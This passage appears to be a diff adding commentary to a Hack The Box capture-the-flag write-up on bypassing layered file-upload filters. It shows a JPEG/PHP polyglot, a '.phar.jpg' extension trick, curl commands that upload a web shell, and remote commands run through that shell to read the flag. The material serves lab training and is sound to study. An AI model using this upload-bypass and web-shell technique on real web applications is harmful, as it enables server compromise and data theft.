@@ -33,6 +33,7 @@ curl -X POST "http://TARGET/contact/upload.php" -F "uploadFile=@/tmp/sh.php"
 # .phar.jpg, .phtml.jpg, .php.jpg variants
 # → "Only images are allowed" or "Extension not allowed"
 ```
+> Initial probes to map which filters are active. Different error messages for different variants tell you whether the block comes from the blacklist or the whitelist.
 
 Mixed responses suggest **multiple filters**: extension blacklist + extension whitelist + Content-Type/MIME.
 
@@ -74,6 +75,7 @@ foreach (array($contentType, $MIMEtype) as $type) {
 // Size limit + move
 if (move_uploaded_file(...)) { displayHTMLImage($target_file); }
 ```
+> The decoded source reveals the exact filter logic. Read the regex carefully — `ph(p|ps|tml)` misses `.phar`, and the whitelist `[a-z]{2,3}g$` matches `.jpg`, `.png`, `.svg`, and `.jpeg`. The filename is also prefixed with `date('ymd')` which is predictable.
 
 **Key filter analysis:**
 
@@ -103,6 +105,7 @@ printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff
 file /tmp/poly.jpg
 # → JPEG image data, JFIF standard 1.01
 ```
+> Uses the real JPEG File Interchange Format (JFIF) header bytes. The `file` command and `mime_content_type()` both report it as a genuine JPEG image.
 
 ### Step 2 — Upload with `.phar.jpg` extension
 
@@ -111,6 +114,7 @@ curl -sk -X POST "http://154.57.164.73:31791/contact/upload.php" \
   -F "uploadFile=@/tmp/poly.jpg;filename=sh.phar.jpg;type=image/jpeg"
 # Response includes the file rendered as base64 inline image — confirms upload succeeded
 ```
+> Sends the polyglot with a `.phar.jpg` filename and `image/jpeg` Content-Type. All four filter layers pass: blacklist (no `ph(p|ps|tml)`), whitelist (ends in `jpg`), Content-Type (`image/jpeg`), and MIME (real JPEG bytes).
 
 ### Step 3 — Access via predictable path
 
@@ -121,6 +125,7 @@ URL="http://154.57.164.73:31791/contact/user_feedback_submissions/${DATE}_sh.pha
 curl -sk -G "$URL" --data-urlencode "c=id"
 # → uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+> Reconstructs the stored filename using the date prefix revealed in the source code. `--data-urlencode` safely passes the command parameter.
 
 ### Step 4 — Locate + read flag
 
@@ -133,6 +138,7 @@ curl -sk -G "$URL" --data-urlencode "c=ls /"
 curl -sk -G "$URL" --data-urlencode "c=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt" | strings | grep "HTB{"
 # → HTB{m4573r1ng_upl04d_3xpl0174710n}
 ```
+> The `strings` filter removes the binary JPEG header bytes from the output so `grep` can match the flag string cleanly.
 
 **Flag:** `HTB{m4573r1ng_upl04d_3xpl0174710n}`
 
